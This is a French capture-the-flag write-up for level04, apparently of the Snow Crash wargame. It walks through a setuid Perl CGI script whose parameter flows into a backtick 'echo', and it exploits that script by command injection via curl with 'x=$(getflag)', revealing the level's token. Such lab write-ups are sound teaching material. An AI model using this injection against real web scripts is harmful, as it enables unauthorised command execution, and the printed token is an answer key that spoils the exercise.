Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)
/home/user/level04
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

Et j'observe un fichier `level04.pl`.

```
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

J'observe que c'est un script en `perl`. Je note aussi comme le précédent level, que le programme sera exécuté en tant que l'utilisateur `flag04` et que c'est une piste non-négligeable d'exploitation.

Je ne connais pas le langage `perl` mais détermine que le script tente d'importer `CGI` avec `use CGI`. Une recherche google m'amène sur le [site d'Apache](https://httpd.apache.org/docs/2.4/fr/howto/cgi.html) avec la description suivante :

```
CGI (Common Gateway Interface) définit une méthode d'interaction entre un serveur web et des programmes générateurs de contenu externes, plus souvent appelés programmes CGI ou scripts CGI. Il s'agit d'une méthode simple pour ajouter du contenu dynamique à votre site web en utilisant votre langage de programmation préféré...
```

J'estime donc que ce script va tenter d'interagir avec un serveur web à l'adresse suivante : `# localhost:4747` (ligne 2 du script `perl`).

Je me renseigne sur `perl` afin de comprendre le script, que j'ai commenté ci-dessous :

```perl
#!/usr/bin/perl
# localhost:4747 <- Most likely just a hint

# Use CGI module, importing the 'param' function. It's used to handle query parameters.
use CGI qw{param}; 

# Print the HTTP header
print "Content-type: text/html\n\n";

# Defines a 'subroutine', equivalent of a function
sub x {
  # Assigns the first arguments it receives to $y
  $y = $_[0];
  # Echoes '$y' while returning both stdout and stderr
  print `echo $y 2>&1`;
}

# Calls the subroutine 'x' defined above passing it the value of the 'x' parameter that was passed to the HTTP request
x(param("x"));
```

Il semble donc que le script ne se résume qu'à un simple `echo`. Je tente donc de l'exécuter et voir si j'arrive à appeler la subroutine `x` sans faire de requête HTTP :

```
$ ./level04.pl hello
Content-type: text/html


```

Je tente une approche qui ressemble à une requête HTTP :

```
$ ./level04.pl x=hello
Content-type: text/html

hello
```

Dans l'esprit du précédent niveau, je me demande si je peux demander un `echo getflag` puisque c'est `flag04` qui exécute le programme :

```
$ ./level04.pl x=getflag
Content-type: text/html

getflag
```

Sans succès, je tente l'approche avec '$()' :

```
$ ./level04.pl x=$(getflag)
Content-type: text/html

Check
```

Je trouve le début de la réponse de `getflag`, mais je n'obtiens que le premier mot.
J'ai un soupçon, et lance `getflag` en tant que `level04` et obtiens :

```
$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

Il se pourrait donc que le `getflag` que je lance au travers du script `perl` soit en fait le miens, puisque le retour commence également par `Check`.

Je tente de savoir qui lance la commande :

```
$ ./level04.pl x=$(whoami)
Content-type: text/html

level04
```

D'accord. Cela signifie donc que c'est `level04` qui exécute ces commandes, pourtant le programme, comme vu au départ, à bien le `setuid` mis pour `flag04`.

D'après cette discussions :  [Can I setuid a perl script?](https://stackoverflow.com/questions/21597300/can-i-setuid-a-perl-script) le `setuid` est ignoré par les versions de `perl` > 5.12.0 :

```
$ perl --version

This is perl 5, version 14, subversion 2 (v5.14.2) built for i686-linux-gnu-thread-multi-64int
(with 57 registered patches, see perl -V for more detail)
```

Je suis sur `perl 5.14.2` et donc ne peut pas exploiter cette vulnérabilité.

Je me re-penche donc sur la partie `Apache` du contexte de ce script et tente de l'exécuter tel une requête HTTP, avec le hint donné dans le script (`localhost:4747`) :

```
$ curl 'localhost:4747/level04.pl?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```





